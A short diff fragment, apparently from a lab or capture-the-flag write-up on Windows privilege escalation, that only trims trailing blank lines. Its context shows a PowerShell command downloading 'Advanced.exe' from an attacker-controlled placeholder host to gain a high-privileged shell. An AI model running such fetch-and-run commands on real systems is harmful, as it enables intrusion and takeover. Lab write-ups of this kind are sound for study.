@@ -134,9 +134,3 @@ With the same web server running on the attack machine we can download the same 
 powershell -c Invoke-WebRequest -Uri http://<ATTACKER_IP>/Advanced.exe -Outfile "Advanced.exe"
 ```
 And repeat the same procedures from the last paragraph to obtain a high privileged shell!
-
-
-
-
-
-
